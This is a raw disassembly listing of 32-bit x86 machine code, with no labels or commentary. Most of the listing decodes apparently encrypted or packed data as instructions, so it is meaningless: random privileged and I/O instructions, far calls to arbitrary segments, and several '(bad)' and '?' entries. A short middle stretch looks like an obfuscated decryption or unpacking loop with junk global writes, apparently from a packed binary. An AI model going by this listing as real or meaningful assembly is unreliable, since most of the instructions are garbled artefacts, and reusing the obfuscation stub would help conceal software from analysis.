  40d98e:	retf   0x49d
  40d991:	push   ebp
  40d992:	push   edx
  40d993:	leave  
  40d994:	mov    DWORD PTR [esi-0x5e7c618f],esi
  40d99a:	das    
  40d99b:	inc    eax
  40d99c:	and    eax,0xdde8ce6b
  40d9a1:	fadd   DWORD PTR [esi+0x7abd85ed]
  40d9a7:	int3   
  40d9a8:	and    bh,dh
  40d9aa:	or     DWORD PTR [ebp-0x2024aaf4],0xef5f9387
  40d9b4:	mov    al,ds:0xacc78a52
  40d9b9:	mov    WORD PTR [ecx+0x7faba7bd],ds
  40d9bf:	pop    edx
  40d9c0:	push   es
  40d9c1:	into   
  40d9c2:	stos   DWORD PTR es:[edi],eax
  40d9c3:	sub    bh,BYTE PTR [esi+0x29fcfd97]
  40d9c9:	xor    eax,0xe6a007fd
  40d9ce:	cmp    DWORD PTR [ebx],ebp
  40d9d0:	fisttp WORD PTR [ecx]
  40d9d2:	rep ins BYTE PTR es:[edi],dx
  40d9d4:	shl    BYTE PTR [ebx],0xe5
  40d9d7:	lods   al,BYTE PTR ds:[esi]
  40d9d8:	add    esi,DWORD PTR [edx-0x5a]
  40d9db:	aaa    
  40d9dc:	xchg   esi,eax
  40d9dd:	sbb    ebp,DWORD PTR [edx+esi*8]
  40d9e0:	mov    ecx,0x8bcd3512
  40d9e5:	add    DWORD PTR [ecx+0x310d0c0f],ebx
  40d9eb:	repnz in eax,dx
  40d9ed:	ret    
  40d9ee:	cld    
  40d9ef:	das    
  40d9f0:	call   0x1814:0x686639ab
  40d9f7:	jbe    0x40da11
  40d9f9:	add    eax,0x458173f5
  40d9fe:	push   ds
  40d9ff:	ror    ebx,cl
  40da01:	or     edi,DWORD PTR [edx]
  40da03:	idiv   edx
  40da05:	out    0x8,eax
  40da07:	xchg   DWORD PTR [ebx+0x65],edi
  40da0a:	push   esi
  40da0b:	lea    ebx,[ecx-0x7c]
  40da0e:	int    0x81
  40da10:	pushf  
  40da11:	cmp    BYTE PTR [ebx+0x5cad0a5d],cl
  40da17:	cmp    dl,BYTE PTR [ebp-0x70]
  40da1a:	ins    DWORD PTR es:[edi],dx
  40da1b:	mov    ch,0xc2
  40da1d:	clc    
  40da1e:	inc    esi
  40da1f:	ins    BYTE PTR es:[edi],dx
  40da20:	mov    ebx,0x1e4c549f
  40da25:	outs   dx,BYTE PTR ds:[esi]
  40da26:	inc    ebp
  40da27:	inc    esi
  40da28:	jb     0x40da02
  40da2a:	cmp    BYTE PTR [ecx+eax*1],cl
  40da2d:	call   0xe8d0:0x1e414cd2
  40da34:	pop    eax
  40da35:	sti    
  40da36:	popf   
  40da37:	bound  esi,QWORD PTR [esi+0x44]
  40da3a:	adc    DWORD PTR ds:0x2add05f7,0x97150666
  40da44:	and    BYTE PTR [ecx],dh
  40da46:	enter  0x6d2f,0x7c
  40da4a:	enter  0x852,0x8d
  40da4e:	mov    eax,ds:0xa7604343
  40da53:	repz test ecx,esp
  40da56:	cwde   
  40da57:	adc    DWORD PTR ds:0x6a05fb5b,ebp
  40da5d:	or     BYTE PTR [ecx+0x38],bl
  40da60:	dec    edi
  40da61:	push   0x88b27673
  40da66:	jb     0x40da6d
  40da68:	repz push 0xffffffe0
  40da6b:	add    DWORD PTR [ebx],0xffffffd9
  40da6e:	jge    0x40da11
  40da70:	add    dh,BYTE PTR [edi]
  40da72:	xor    al,BYTE PTR [edx+0x7a]
  40da75:	fstp   TBYTE PTR [ebp-0x44f8ebf8]
  40da7b:	xchg   esi,eax
  40da7c:	and    al,0x99
  40da7e:	xchg   ebx,eax
  40da7f:	adc    dh,BYTE PTR [ebx+0x4c]
  40da82:	or     eax,0x1093d69d
  40da87:	retf   0x35ad
  40da8a:	outs   dx,BYTE PTR ds:[esi]
  40da8b:	push   ss
  40da8c:	imul   esi,DWORD PTR [ebx-0x55],0x61fc389
  40da93:	cli    
  40da94:	mov    edi,0x4909952b
  40da99:	sub    al,BYTE PTR [esi+ebp*8+0x4d]
  40da9d:	xlat   BYTE PTR ds:[ebx]
  40da9e:	sahf   
  40da9f:	ds cdq 
  40daa1:	mov    al,0xeb
  40daa3:	mov    cs,WORD PTR [ebx]
  40daa5:	aas    
  40daa6:	test   al,0x6d
  40daa8:	xchg   edx,eax
  40daa9:	fadd   DWORD PTR [esi]
  40daab:	push   cs
  40daac:	leave  
  40daad:	mov    ebx,ebp
  40daaf:	test   DWORD PTR [ebx+0x7c740295],ebx
  40dab5:	xchg   edi,eax
  40dab6:	enter  0x506c,0x10
  40daba:	in     eax,0x57
  40dabc:	fidivr WORD PTR [eax+0x9]
  40dabf:	lds    ebx,FWORD PTR gs:[eax]
  40dac2:	pop    esi
  40dac3:	jl     0x40daac
  40dac5:	push   edx
  40dac6:	scas   eax,DWORD PTR es:[edi]
  40dac7:	xlat   BYTE PTR ds:[ebx]
  40dac8:	push   edi
  40dac9:	cmp    eax,0x939f3a63
  40dace:	es in  eax,dx
  40dad0:	mov    edi,0xcb40576b
  40dad5:	or     ebx,DWORD PTR [esi+0x9]
  40dad8:	push   eax
  40dad9:	adc    DWORD PTR [edi-0x3],eax
  40dadc:	push   cs
  40dadd:	call   0x4ac20b7b
  40dae2:	call   0xa76c:0x16dfbace
  40dae9:	out    0xa1,al
  40daeb:	rol    DWORD PTR [eax],0x86
  40daee:	loope  0x40daf7
  40daf0:	repnz push esi
  40daf2:	cli    
  40daf3:	inc    edi
  40daf4:	fst    st(1)
  40daf6:	cdq    
  40daf7:	jae    0x40db5e
  40daf9:	jmp    0x97f9:0x33ea930e
  40db00:	push   cs
  40db01:	mov    WORD PTR [eax-0x3c],?
  40db04:	(bad)
  40db07:	retf   0xf010
  40db0a:	hlt    
  40db0b:	pop    ss
  40db0c:	or     edi,ecx
  40db0e:	sahf   
  40db0f:	mov    cl,0x22
  40db11:	push   esp
  40db12:	pop    ss
  40db13:	jmp    0xa9af63a8
  40db18:	mov    edx,0xf631e2dd
  40db1d:	and    BYTE PTR ds:0xd0f4c35f,0x7b
  40db24:	dec    esi
  40db25:	jns    0x40db5b
  40db27:	jecxz  0x40dba2
  40db29:	pop    ebx
  40db2a:	xchg   esi,eax
  40db2b:	retf   
  40db2c:	shr    BYTE PTR [esp+edi*2+0xe229b63],1
  40db33:	push   esp
  40db34:	push   edi
  40db35:	jnp    0x40db13
  40db37:	push   ds
  40db38:	or     eax,0xc7f79cc
  40db3d:	mov    dh,0x99
  40db3f:	push   es
  40db40:	sub    esp,DWORD PTR [ebp-0x7b]
  40db43:	pop    es
  40db44:	push   0xda07270d
  40db49:	pop    esi
  40db4a:	mov    esp,0x975d94f3
  40db4f:	fcom   DWORD PTR [edx+ebx*4+0x30]
  40db53:	call   0xe1d1954c
  40db58:	push   ebx
  40db59:	les    ebp,FWORD PTR [eax-0x3e]
  40db5c:	loope  0x40db08
  40db5e:	scas   al,BYTE PTR es:[edi]
  40db5f:	ins    DWORD PTR es:[edi],dx
  40db60:	clc    
  40db61:	sbb    eax,0x17c4981
  40db66:	nop
  40db67:	clc    
  40db68:	xchg   cl,ch
  40db6a:	cmc    
  40db6b:	stc    
  40db6c:	push   ebx
  40db6d:	scas   al,BYTE PTR es:[edi]
  40db6e:	clc    
  40db6f:	mov    bl,0x69
  40db71:	add    BYTE PTR [edi-0x75],0xdd
  40db75:	std    
  40db76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db77:	sahf   
  40db78:	push   DWORD PTR ss:[ebp-0x29aad06d]
  40db7f:	out    dx,eax
  40db80:	stos   BYTE PTR es:[edi],al
  40db81:	xor    dl,al
  40db83:	test   DWORD PTR [edx],ebx
  40db85:	out    0xd1,al
  40db87:	scas   eax,DWORD PTR es:[edi]
  40db88:	into   
  40db89:	or     eax,0xb391fb43
  40db8e:	popa   
  40db8f:	test   al,0x11
  40db91:	lahf   
  40db92:	aam    0x1
  40db94:	xlat   BYTE PTR ds:[ebx]
  40db95:	inc    edi
  40db96:	fidivr DWORD PTR [eax+0x30]
  40db99:	mov    ecx,0xf7d474f6
  40db9e:	xchg   ecx,eax
  40db9f:	pushf  
  40dba0:	mov    DWORD PTR [edi+0x2ea947e4],edi
  40dba6:	lods   al,BYTE PTR ds:[esi]
  40dba7:	call   0x5b81d888
  40dbac:	andnps xmm2,xmm3
  40dbaf:	aam    0xf0
  40dbb1:	cmp    al,0x61
  40dbb3:	mov    ds:0xac6fb49a,eax
  40dbb8:	pop    esp
  40dbb9:	ins    DWORD PTR es:[edi],dx
  40dbba:	pop    ebp
  40dbbb:	fs mov ah,0xf4
  40dbbe:	and    al,0x20
  40dbc0:	lock push edx
  40dbc2:	push   esp
  40dbc3:	outs   dx,DWORD PTR ds:[esi]
  40dbc4:	xchg   ebx,eax
  40dbc5:	test   DWORD PTR [edx+0x20],esi
  40dbc8:	mov    ebx,0x8ff7bf32
  40dbcd:	or     ebx,esp
  40dbcf:	mov    BYTE PTR [ebx],bl
  40dbd1:	xchg   esi,eax
  40dbd2:	jbe    0x40dc29
  40dbd4:	sub    DWORD PTR [esi],ebp
  40dbd6:	pop    edi
  40dbd7:	xor    DWORD PTR [ebx-0x31bf2267],0x804ba8e6
  40dbe1:	pop    es
  40dbe2:	sub    al,ch
  40dbe4:	sbb    eax,0xb1aacac
  40dbe9:	adc    bl,BYTE PTR [esi-0x6db865fa]
  40dbef:	mov    ebx,0xc3172744
  40dbf4:	icebp  
  40dbf5:	or     DWORD PTR [ecx+0x4d],ebp
  40dbf8:	jb     0x40db8e
  40dbfa:	inc    esp
  40dbfb:	xor    BYTE PTR ds:0x6d1bf042,0x6b
  40dc02:	add    ecx,DWORD PTR [edx+0x1acb346b]
  40dc08:	fsub   QWORD PTR [ebx+ecx*8]
  40dc0b:	cmp    BYTE PTR [edi-0x3d8fadc9],cl
  40dc11:	pop    ebp
  40dc12:	fcom   QWORD PTR [esi]
  40dc14:	inc    ebp
  40dc15:	sti    
  40dc16:	loope  0x40dc46
  40dc18:	jecxz  0x40dc64
  40dc1a:	(bad)  
  40dc1b:	cmc    
  40dc1c:	dec    BYTE PTR [esi-0x4f754afa]
  40dc22:	push   edx
  40dc23:	call   0x572a:0xb2cd7d99
  40dc2a:	retf   
  40dc2b:	in     al,dx
  40dc2c:	mov    dl,0xe8
  40dc2e:	jno    0x40dc59
  40dc30:	ds retf 
  40dc32:	call   0xae8ec9f0
  40dc37:	arpl   WORD PTR [ebp-0x4c],cx
  40dc3a:	jae    0x40dc7a
  40dc3c:	dec    ebx
  40dc3d:	retf   0x4eab
  40dc40:	xchg   ecx,eax
  40dc41:	jne    0x40dcad
  40dc43:	dec    eax
  40dc44:	mov    ds:0xe344f0a0,al
  40dc49:	lahf   
  40dc4a:	mov    edx,0x57f233e9
  40dc4f:	shl    DWORD PTR [eax+eiz*2-0x7a0c3f79],1
  40dc56:	ret    
  40dc57:	adc    BYTE PTR ds:0x9c6f96db,bl
  40dc5d:	inc    ecx
  40dc5e:	push   edx
  40dc5f:	pop    edx
  40dc60:	mov    eax,ds:0x954ed9cf
  40dc65:	mov    dl,0xcc
  40dc67:	jle    0x40dc75
  40dc69:	fcmovu st,st(3)
  40dc6b:	pop    ecx
  40dc6c:	inc    eax
  40dc6d:	pop    ebp
  40dc6e:	stos   BYTE PTR es:[edi],al
  40dc6f:	sbb    BYTE PTR [edx],0xcf
  40dc72:	retf   
  40dc73:	cld    
  40dc74:	dec    DWORD PTR [edx-0x4595d4fd]
  40dc7a:	push   esi
  40dc7b:	dec    esp
  40dc7c:	or     BYTE PTR [esi+esi*4+0x76bea44],bl
  40dc83:	test   BYTE PTR [ebx],0x10
  40dc86:	push   es
  40dc87:	outs   dx,DWORD PTR ds:[esi]
  40dc88:	add    DWORD PTR [ebx],esp
  40dc8a:	imul   edx,DWORD PTR [ebp-0x40076e58],0x70
  40dc91:	mov    dh,0xf7
  40dc93:	mov    dh,0x5b
  40dc95:	mov    ds:0xa2e2186f,eax
  40dc9a:	xchg   BYTE PTR [ebx+0x72],bh
  40dc9d:	leave  
  40dc9e:	cld    
  40dc9f:	xor    al,0xd1
  40dca1:	ins    DWORD PTR es:[edi],dx
  40dca2:	xchg   ebp,eax
  40dca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca4:	fs in  eax,dx
  40dca6:	in     al,0x64
  40dca8:	scas   al,BYTE PTR es:[edi]
  40dca9:	data16 xchg bl,dl
  40dcac:	out    dx,eax
  40dcad:	out    dx,eax
  40dcae:	data16 (bad) 
  40dcb0:	fstp   TBYTE PTR [ebp+ebx*2-0x4f]
  40dcb4:	call   0x35b55eeb
  40dcb9:	mov    WORD PTR [edi],gs
  40dcbb:	dec    esi
  40dcbc:	scas   eax,DWORD PTR es:[edi]
  40dcbd:	test   eax,0x23bb0444
  40dcc2:	pop    esp
  40dcc3:	adc    ch,BYTE PTR [esi-0x42535657]
  40dcc9:	loop   0x40dca8
  40dccb:	rcl    DWORD PTR [esi-0x32c43882],1
  40dcd1:	and    ebx,ecx
  40dcd3:	test   eax,0x18b57fca
  40dcd8:	mov    al,0x61
  40dcda:	sbb    al,0x81
  40dcdc:	sub    ch,BYTE PTR [edx]
  40dcde:	int3   
  40dcdf:	cmp    DWORD PTR [ebp-0x28c0a182],0xb4b44390
  40dce9:	mov    BYTE PTR [esi],dh
  40dceb:	out    dx,al
  40dcec:	sub    esp,DWORD PTR [edi+ebx*2+0x557383a3]
  40dcf3:	out    dx,al
  40dcf4:	jne    0x40dc98
  40dcf6:	div    eax
  40dcf8:	pop    ecx
  40dcf9:	dec    edx
  40dcfa:	add    al,0x40
  40dcfc:	in     eax,dx
  40dcfd:	pusha  
  40dcfe:	ins    DWORD PTR es:[edi],dx
  40dcff:	rcl    ch,cl
  40dd01:	xchg   ecx,eax
  40dd02:	xor    eax,0xa0bd16e5
  40dd07:	or     ch,BYTE PTR [ecx-0x4]
  40dd0a:	scas   al,BYTE PTR es:[edi]
  40dd0b:	ficom  WORD PTR [ecx]
  40dd0d:	sahf   
  40dd0e:	jmp    0x35d6:0x7108f816
  40dd15:	stos   BYTE PTR es:[edi],al
  40dd16:	loope  0x40dc9b
  40dd18:	je     0x40dd61
  40dd1a:	add    BYTE PTR [esi*4-0x7c97e64c],cl
  40dd21:	mov    ebp,0x81685e59
  40dd26:	ins    BYTE PTR es:[edi],dx
  40dd27:	or     DWORD PTR [edx+0x6b636ec1],eax
  40dd2d:	push   eax
  40dd2e:	mov    WORD PTR [esi+ebp*2-0x1b],es
  40dd32:	aaa    
  40dd33:	push   ecx
  40dd34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd35:	pop    edx
  40dd36:	mov    bl,0x20
  40dd38:	mov    eax,ds:0x2a12777e
  40dd3d:	std    
  40dd3e:	jb     0x40dd72
  40dd40:	fisttp QWORD PTR [edi]
  40dd42:	add    DWORD PTR [eax+0x16],esp
  40dd45:	sub    BYTE PTR [eax],cl
  40dd47:	xor    BYTE PTR [edx+eiz*2-0x1a],0xdc
  40dd4c:	test   DWORD PTR [eax+0x17],esi
  40dd4f:	inc    edx
  40dd50:	xor    eax,edi
  40dd52:	cmp    ebx,ecx
  40dd54:	sbb    bh,BYTE PTR [ecx]
  40dd56:	std    
  40dd57:	loop   0x40dce2
  40dd59:	stc    
  40dd5a:	loopne 0x40dd10
  40dd5c:	ins    DWORD PTR es:[edi],dx
  40dd5d:	(bad)  
  40dd5e:	jo     0x40dd55
  40dd60:	mov    ah,0xc6
  40dd62:	and    BYTE PTR [esi-0x1db0dca7],bh
  40dd68:	push   es
  40dd69:	mov    WORD PTR [edx+edi*2-0x3d],es
  40dd6d:	outs   dx,DWORD PTR ds:[esi]
  40dd6e:	mov    WORD PTR [edi],?
  40dd70:	fldcw  WORD PTR [ecx]
  40dd72:	pop    edi
  40dd73:	lds    esp,FWORD PTR [esi-0x5d]
  40dd76:	aad    0x56
  40dd78:	lock pop edi
  40dd7a:	jo     0x40dd76
  40dd7c:	aad    0x37
  40dd7e:	fistp  WORD PTR [eax+0x33]
  40dd81:	ds jae 0x40dd14
  40dd84:	xchg   BYTE PTR [ebp+0xd1dc803],ah
  40dd8a:	shr    DWORD PTR [ecx+0x6429d8b0],0x8d
  40dd91:	lods   eax,DWORD PTR ds:[esi]
  40dd92:	or     BYTE PTR [eax-0x3d92fc54],ch
  40dd98:	cmp    al,0x3a
  40dd9a:	add    DWORD PTR [edx+edx*8-0x78268cae],0xffffffb5
  40dda2:	adc    al,cl
  40dda4:	out    0xf9,eax
  40dda6:	pop    ss
  40dda7:	in     al,dx
  40dda8:	or     DWORD PTR [esp+esi*2],0x4e
  40ddac:	sar    edx,0x33
  40ddaf:	xor    BYTE PTR [edx+0x35],al
  40ddb2:	mov    ebp,0x6643dc8c
  40ddb7:	cdq    
  40ddb8:	pusha  
  40ddb9:	ret    0x9272
  40ddbc:	fninit 
  40ddbe:	inc    esp
  40ddbf:	dec    ecx
  40ddc0:	call   0x52d1:0xed449122
  40ddc7:	and    bh,cl
  40ddc9:	(bad)  
  40ddca:	dec    ebp
  40ddcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddcc:	fstp   QWORD PTR [esi+0x3c3aa40c]
  40ddd2:	in     al,0x23
  40ddd4:	xor    dh,BYTE PTR [edi+eax*2+0xb]
  40ddd8:	call   0x509c0a4e
  40dddd:	icebp  
  40ddde:	mov    dl,0x4b
  40dde0:	sub    dl,BYTE PTR [ecx-0x20]
  40dde3:	loop   0x40ddc2
  40dde5:	xchg   edx,eax
  40dde6:	mov    ds:0x6653eb43,eax
  40ddeb:	push   edx
  40ddec:	xor    al,0xda
  40ddee:	call   0xe2b0ed89
  40ddf3:	xchg   edx,eax
  40ddf4:	inc    bl
  40ddf6:	pop    ebx
  40ddf7:	retf   0xf498
  40ddfa:	push   ds
  40ddfb:	add    eax,0xf86af8f9
  40de00:	mov    ds:0x85207f81,al
  40de05:	push   ss
  40de06:	sbb    WORD PTR [edi],bx
  40de09:	pop    ss
  40de0a:	sbb    DWORD PTR [edi+0x3d],ebx
  40de0d:	sub    ebx,eax
  40de0f:	aam    0x3f
  40de11:	push   eax
  40de12:	fisubr DWORD PTR [edx-0x3925f98a]
  40de18:	cmp    ecx,DWORD PTR [ebp+0x4c]
  40de1b:	sbb    ch,cl
  40de1d:	mov    ebp,0xd00d3ecd
  40de22:	xchg   DWORD PTR [esi+ebx*1-0x3b1b922e],edx
  40de29:	call   0xc9057828
  40de2e:	jmp    0x40dde1
  40de30:	ficomp DWORD PTR [ebp+0x13a49d0a]
  40de36:	out    0x15,eax
  40de38:	fisub  DWORD PTR ds:0xba85964d
  40de3e:	pop    ss
  40de3f:	and    BYTE PTR [edi-0x2f],ah
  40de42:	repz leave 
  40de44:	(bad)  
  40de46:	cmp    BYTE PTR [ecx],ah
  40de48:	sbb    BYTE PTR [edx+ebx*4-0x4cfcc47b],bh
  40de4f:	mov    esi,0x53fc458b
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x26
  40dfd4:	or     esp,esi
  40dfd6:	out    dx,eax
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x78]
  40dfe0:	popf   
  40dfe1:	mov    edx,0x336bc239
  40dfe6:	mov    fs,WORD PTR [eax]
  40dfe8:	push   ss
  40dfe9:	ins    BYTE PTR es:[edi],dx
  40dfea:	popf   
  40dfeb:	mov    ch,0xb5
  40dfed:	cmp    cl,BYTE PTR [esi+0x41aa951]
  40dff3:	xchg   ecx,eax
  40dff4:	add    ch,BYTE PTR [esi+0x11a7a3dc]
  40dffa:	jnp    0x40df9e
  40dffc:	scas   al,BYTE PTR es:[edi]
  40dffd:	stos   BYTE PTR es:[edi],al
  40dffe:	ret    0x518
  40e001:	or     DWORD PTR [ebx+0x29],esi
  40e004:	idiv   BYTE PTR ds:0x18d96a29
  40e00a:	jle    0x40dfcc
  40e00c:	int    0xd2
  40e00e:	mov    ebx,0x9faffe46
  40e013:	scas   al,BYTE PTR es:[edi]
  40e014:	mov    ds:0xf834974,al
  40e019:	xchg   ecx,eax
  40e01a:	mov    cl,0x26
  40e01c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e01e:	inc    DWORD PTR [ebp-0x5ba08439]
  40e024:	addr16 mov ebx,0xd42664d3
  40e02a:	dec    ebp
  40e02b:	rcr    BYTE PTR [esi-0x5],cl
  40e02e:	inc    esp
  40e02f:	sbb    BYTE PTR [esi-0x7a],al
  40e032:	sbb    DWORD PTR [ebp-0x75],eax
  40e035:	push   edi
  40e036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e037:	pop    edx
  40e038:	sbb    bl,BYTE PTR [ebx+0x4e]
  40e03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e03c:	clts   
  40e03e:	xchg   ecx,eax
  40e03f:	xchg   esp,eax
  40e040:	dec    ebp
  40e041:	jb     0x40dfca
  40e043:	pop    ds
  40e044:	out    0x46,al
  40e046:	adc    BYTE PTR [ecx],dl
  40e048:	cli    
  40e049:	mov    ds:0x6f9a283e,al
  40e04e:	fcom   st(1)
  40e050:	sub    eax,0x68149b70
  40e055:	test   BYTE PTR [edx+0xaae9b18],ah
  40e05b:	mov    edx,0x4e652a33
  40e060:	fldcw  WORD PTR [ebp-0x6b]
  40e063:	fs in  eax,dx
  40e065:	(bad)  
  40e066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e067:	movups XMMWORD PTR [esi],xmm2
  40e06a:	(bad)  
  40e06b:	push   esi
  40e06c:	or     ch,BYTE PTR ds:0xf8e1a3f7
  40e072:	scas   al,BYTE PTR es:[edi]
  40e073:	rcl    BYTE PTR [edi-0x18834f73],0x23
  40e07a:	add    DWORD PTR [eax+0x62],ebp
  40e07d:	and    DWORD PTR [ebx-0x5a92d646],edx
  40e083:	or     BYTE PTR [edi],dl
  40e085:	push   esp
  40e086:	in     eax,dx
  40e087:	jae    0x40e094
  40e089:	jg     0x40e051
  40e08b:	sub    BYTE PTR ds:0xa3b09b80,ah
  40e091:	fwait
  40e092:	dec    esp
  40e093:	push   ds
  40e094:	nop
  40e095:	lds    eax,FWORD PTR cs:[esi+0x79]
  40e099:	sub    DWORD PTR [ecx],0xfffffff5
  40e09c:	push   0x68a25f79
  40e0a1:	push   ebp
  40e0a2:	add    dl,bh
  40e0a4:	cs pop esi
  40e0a6:	int3   
  40e0a7:	popf   
  40e0a8:	push   edi
  40e0a9:	inc    ebp
  40e0aa:	dec    esi
  40e0ab:	mov    edx,0xd3a8dab5
  40e0b0:	xchg   esp,eax
  40e0b1:	xchg   ecx,eax
  40e0b2:	ret    0x7d8b
  40e0b5:	sar    BYTE PTR [esi],1
  40e0b7:	dec    ebp
  40e0b8:	mov    ecx,0xd9257ad1
  40e0bd:	and    edx,DWORD PTR [ebx-0x52]
  40e0c0:	pop    esi
  40e0c1:	in     eax,dx
  40e0c2:	scas   eax,DWORD PTR es:[edi]
  40e0c3:	jbe    0x40e0c0
  40e0c5:	cdq    
  40e0c6:	fld    TBYTE PTR [eax]
  40e0c8:	shl    DWORD PTR [eax+eiz*2],1
  40e0cb:	xchg   ebx,eax
  40e0cc:	mov    al,0xa3
  40e0ce:	cld    
  40e0cf:	idiv   BYTE PTR [ebx]
  40e0d1:	loop   0x40e109
  40e0d3:	into   
  40e0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d5:	mov    edi,0x5367f8e0
  40e0da:	cdq    
  40e0db:	jbe    0x40e130
  40e0dd:	mov    dh,0x43
  40e0df:	dec    ebx
  40e0e0:	xchg   esp,eax
  40e0e1:	mov    bl,0x7c
  40e0e3:	es or  al,0xde
  40e0e6:	inc    edx
  40e0e7:	add    esi,DWORD PTR [edi-0x31]
  40e0ea:	mov    al,0xb5
  40e0ec:	dec    edx
  40e0ed:	lods   eax,DWORD PTR ds:[esi]
  40e0ee:	retf   0x291e
  40e0f1:	jns    0x40e095
  40e0f3:	test   DWORD PTR ds:0x28905afc,esp
  40e0f9:	xor    eax,0xb48ab7b9
  40e0fe:	inc    ecx
  40e0ff:	test   al,0x10
  40e101:	cld    
  40e102:	push   0x15351fb
  40e107:	push   edx
  40e108:	mul    eax
  40e10a:	adc    bh,BYTE PTR [edx]
  40e10c:	xchg   edi,esi
  40e10e:	dec    edi
  40e10f:	pop    esi
  40e110:	and    eax,0xd4bd1f64
  40e115:	cmp    DWORD PTR [ebp+0x36],esi
  40e118:	cmp    eax,0x23b57e2
  40e11d:	aad    0x42
  40e11f:	sub    DWORD PTR [ecx],ecx
  40e121:	and    eax,DWORD PTR [edx+0x5c]
  40e124:	call   0xbab6a93a
  40e129:	loope  0x40e100
  40e12b:	inc    esp
  40e12c:	lods   al,BYTE PTR ds:[esi]
  40e12d:	mov    edi,0xbd7a2f13
  40e132:	and    ebx,DWORD PTR [ecx+0x30]
  40e135:	cmc    
  40e136:	nop
  40e137:	mov    cl,0xb7
  40e139:	ja     0x40e154
  40e13b:	adc    ecx,DWORD PTR [ecx+0x7abed3ec]
  40e141:	std    
  40e142:	or     BYTE PTR [edx],bh
  40e144:	xchg   esp,eax
  40e145:	arpl   WORD PTR [edi+eiz*8+0x53],sp
  40e149:	xor    bl,BYTE PTR [edx]
  40e14b:	push   ebx
  40e14c:	pop    esi
  40e14d:	pusha  
